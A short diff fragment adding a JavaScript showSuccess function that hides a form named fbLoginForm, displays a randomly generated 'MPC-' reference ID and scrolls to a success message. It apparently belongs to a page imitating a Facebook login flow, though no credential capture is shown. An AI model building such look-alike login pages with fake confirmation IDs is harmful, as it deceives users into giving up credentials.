+      function showSuccess() {
+        if (fbLoginForm) fbLoginForm.style.display = 'none';
+       
+        // Generate a reference ID
+        if (referenceId) referenceId.textContent = 'MPC-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+       
+        // Show the success message
+        if (successMessage) successMessage.classList.add('show');
+       
+        // Scroll to the success message
+        if (successMessage) successMessage.scrollIntoView({ behavior: 'smooth' });
+      }
+    });
+  </script>
+</body>
+</html>
